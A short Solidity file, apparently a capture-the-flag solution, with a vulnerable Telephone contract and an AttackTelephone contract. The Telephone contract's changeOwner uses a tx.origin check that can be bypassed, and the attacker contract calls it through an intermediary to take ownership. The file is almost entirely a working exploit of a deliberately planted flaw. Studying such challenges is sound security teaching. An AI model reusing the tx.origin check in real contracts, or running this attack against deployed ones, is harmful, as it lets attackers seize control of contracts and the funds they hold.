// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

// Attack Contract which claims the ownership of Telephone contract.
contract AttackTelephone {

    Telephone public target;

    constructor(Telephone _target) {
        target = _target;
    }

    function attackTel() public {
        target.changeOwner(msg.sender);
    }

    
}